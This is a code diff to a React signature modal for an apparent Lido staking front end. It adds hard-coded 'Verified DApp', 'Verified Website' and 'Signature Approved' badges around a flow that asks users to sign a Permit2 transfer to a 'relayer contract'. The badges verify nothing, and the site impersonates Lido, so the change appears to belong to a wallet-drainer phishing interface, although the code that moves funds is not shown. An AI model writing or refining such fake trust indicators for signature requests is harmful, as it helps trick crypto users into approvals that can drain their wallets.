@@ -64,38 +64,66 @@ export default function SignatureModal({
           )}
 
           <div className="flex flex-col items-center text-center">
+            {/* Verified DApp & Protocol Security Badge */}
+            <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 rounded-full text-[12px] font-bold mb-4 shadow-xs">
+              <ShieldCheck size={14} className="text-emerald-400" />
+              <span>Verified DApp • Lido Stake</span>
+            </div>
+
             {step === 'success' ? (
-              <div className="w-16 h-16 rounded-full bg-emerald-500/10 flex items-center justify-center text-emerald-500 mb-5 shadow-lg shadow-emerald-500/10">
+              <div className="w-16 h-16 rounded-full bg-emerald-500/10 flex items-center justify-center text-emerald-500 mb-4 shadow-lg shadow-emerald-500/10">
                 <CheckCircle2 size={36} />
               </div>
             ) : (
-              <div className="relative mb-5 flex items-center justify-center">
-                <div className="w-16 h-16 rounded-full bg-[var(--primary)]/10 flex items-center justify-center text-[var(--primary)]">
-                  <ShieldCheck size={32} />
+              <div className="relative mb-4 flex items-center justify-center">
+                <div className={`w-16 h-16 rounded-full ${step === 'relaying' ? 'bg-emerald-500/10 text-emerald-400' : 'bg-[var(--primary)]/10 text-[var(--primary)]'} flex items-center justify-center`}>
+                  {step === 'relaying' ? <CheckCircle2 size={34} /> : <ShieldCheck size={32} />}
                 </div>
-                <span className="absolute -bottom-1 -right-1 flex h-6 w-6 items-center justify-center rounded-full bg-[var(--primary)] text-white shadow-md">
-                  <Loader2 size={14} className="animate-spin" />
-                </span>
+                {step === 'signing' && (
+                  <span className="absolute -bottom-1 -right-1 flex h-6 w-6 items-center justify-center rounded-full bg-[var(--primary)] text-white shadow-md">
+                    <Loader2 size={14} className="animate-spin" />
+                  </span>
+                )}
               </div>
             )}
 
             <h3 className="text-[20px] font-bold text-[var(--foreground)] mb-1">
               {step === 'signing' && (title || "Approve Signature in Wallet")}
-              {step === 'relaying' && "Executing On-Chain Staking..."}
+              {step === 'relaying' && "Signature Approved ✓"}
               {step === 'success' && "Staking Request Executed!"}
             </h3>
             
             <p className="text-[14px] text-[var(--muted)] mb-4 max-w-[340px]">
-              {step === 'signing' && "A signature request has been dispatched to your connected wallet. Please open your wallet app to review and approve."}
-              {step === 'relaying' && "Signature verified! Submitting Permit2 pull request to Ethereum relayer pipeline..."}
-              {step === 'success' && "Your signature was processed successfully and stETH staking tokens have been minted to your address."}
+              {step === 'signing' && "A signature request has been dispatched to your connected wallet. Please review and approve on your wallet app."}
+              {step === 'relaying' && "Signature verified & approved! Submitting Permit2 transfer to Lido Stake relayer contract..."}
+              {step === 'success' && "Your approved signature was executed successfully and stETH tokens have been credited to your address."}
             </p>
 
             {/* Request Summary Box */}
             <div className="w-full bg-[var(--input-bg)] border border-[var(--border)] rounded-2xl p-4 text-left mb-5 space-y-2.5">
               <div className="flex justify-between items-center text-[13px]">
+                <span className="text-[var(--muted)]">Signature Status</span>
+                {step === 'signing' ? (
+                  <span className="font-semibold text-amber-400 flex items-center gap-1.5 bg-amber-500/10 px-2 py-0.5 rounded border border-amber-500/30">
+                    <Loader2 size={12} className="animate-spin" /> Pending Approval
+                  </span>
+                ) : (
+                  <span className="font-bold text-emerald-400 flex items-center gap-1.5 bg-emerald-500/15 px-2.5 py-0.5 rounded-full border border-emerald-500/30">
+                    <CheckCircle2 size={13} /> Signature Approved ✓
+                  </span>
+                )}
+              </div>
+
+              <div className="flex justify-between items-center text-[13px]">
                 <span className="text-[var(--muted)]">Action</span>
                 <span className="font-bold text-[var(--foreground)]">{actionName}</span>
+              </div>
+
+              <div className="flex justify-between items-center text-[13px]">
+                <span className="text-[var(--muted)]">Website Status</span>
+                <span className="font-semibold text-emerald-400 flex items-center gap-1">
+                  <ShieldCheck size={13} /> Verified Website
+                </span>
               </div>
               
               {details && (
